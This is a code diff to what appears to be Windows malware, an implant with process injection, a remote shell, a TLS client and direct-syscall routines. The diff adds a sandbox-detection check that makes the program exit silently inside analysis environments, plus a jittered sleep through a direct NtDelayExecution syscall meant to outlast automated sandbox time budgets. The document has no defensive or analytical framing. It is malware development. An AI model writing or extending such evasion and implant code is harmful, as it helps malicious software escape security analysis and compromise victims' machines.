@@ -15,6 +15,7 @@
 #include "ntcalls.h"
 #include "../evasion/spoof.h"
 #include "../evasion/evasion.h"
+#include "../evasion/sandbox.h"
 #include "../inject/inject.h"
 #include "../shell/shell.h"
 #include "../../tls/tls_client.h"
@@ -197,6 +198,20 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     inject_init();              /* calls sc_init() — resolves SSNs via PEB   */
 #ifndef DISABLE_AUTO_MIGRATE
     auto_migrate(g_key_path);   /* exits on success; falls through on failure */
+#endif
+
+    /* ── 0e. Sandbox / analysis environment detection ─────────────────── */
+    /*
+     * sandbox_check() returns TRUE if the environment looks like an automated
+     * sandbox (hypervisor + timing anomaly, low RAM, single CPU, or known
+     * analysis DLL loaded).  Exit silently — no error, no dialog, no log.
+     * sandbox_delay() sleeps 15 + jitter(10) seconds via NtDelayExecution
+     * direct syscall to exhaust automated sandbox time budgets.
+     * Disable with -DDISABLE_SANDBOX_CHECK for dev/test builds.
+     */
+#ifndef DISABLE_SANDBOX_CHECK
+    if (sandbox_check()) return 0;
+    sandbox_delay();
 #endif
 
     /* ── 1. Single-instance guard ─────────────────────────────────────── */
